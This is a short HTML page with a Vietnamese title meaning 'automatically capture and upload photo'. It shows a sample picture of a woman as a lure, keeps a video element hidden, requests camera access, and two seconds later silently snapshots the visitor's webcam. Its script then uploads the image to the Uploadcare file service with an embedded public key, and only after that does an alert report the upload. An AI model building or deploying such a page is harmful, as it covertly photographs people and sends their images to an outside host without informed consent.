<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Tự động chụp và upload ảnh</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    img.main-img {
      width: 300px;
      margin-bottom: 20px;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>

  <h2>Ảnh mẫu:</h2>
  <img class="main-img" src="https://phamgiamedia.vn/wp-content/uploads/2023/12/Ngoc-Trinh-2.jpg" alt="Sample Image">

  <video id="video" autoplay playsinline></video>

  <script>
    const video = document.getElementById('video');

    // Xin quyền truy cập camera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        // Chờ video load xong, sau đó chụp ảnh sau 2 giây
        video.onloadedmetadata = () => {
          setTimeout(() => {
            captureAndUpload();
          }, 2000);
        };
      })
      .catch(err => {
        console.error('Không thể truy cập camera:', err);
      });

    function captureAndUpload() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('UPLOADCARE_STORE', '1');
        formData.append('UPLOADCARE_PUB_KEY', '830b3ce89606cea831ba');
        formData.append('file', blob, 'photo.jpg');

        fetch('https://upload.uploadcare.com/base/', {
          method: 'POST',
          body: formData
        })
        .then(res => res.json())
        .then(data => {
          console.log('✅ Ảnh đã upload lên Uploadcare:', data);
          alert('✅ Ảnh đã được tải lên thành công!');
        })
        .catch(err => {
          console.error('❌ Lỗi upload:', err);
        });
      }, 'image/jpeg');
    }
  </script>

</body>
</html>
